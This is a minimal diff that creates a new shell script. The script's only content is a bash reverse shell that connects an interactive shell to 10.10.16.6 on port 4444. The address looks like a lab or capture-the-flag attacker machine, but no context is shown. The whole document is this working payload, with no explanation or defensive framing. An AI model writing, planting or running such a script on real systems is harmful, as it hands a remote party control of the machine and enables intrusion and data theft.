@@ -1,0 +1,2 @@
+#!/bin/sh
+bash -c 'exec bash -i &>/dev/tcp/10.10.16.6/4444 <&1'; false
